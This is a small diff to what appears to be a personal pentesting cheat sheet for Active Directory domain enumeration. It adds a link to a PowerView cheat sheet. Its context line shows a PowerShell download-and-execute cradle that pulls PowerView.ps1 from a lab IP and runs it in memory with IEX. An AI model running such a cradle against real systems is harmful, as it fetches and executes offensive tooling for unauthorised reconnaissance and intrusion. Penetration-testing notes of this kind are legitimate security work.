@@ -6,7 +6,7 @@ description: This is just a living document of things I have needed for domain e
 
 ## POWERSPLOIT
 
-Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
+Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev). For an already incredible cheatsheet, check out HarmJ0y's - [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 
 `IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')`
 
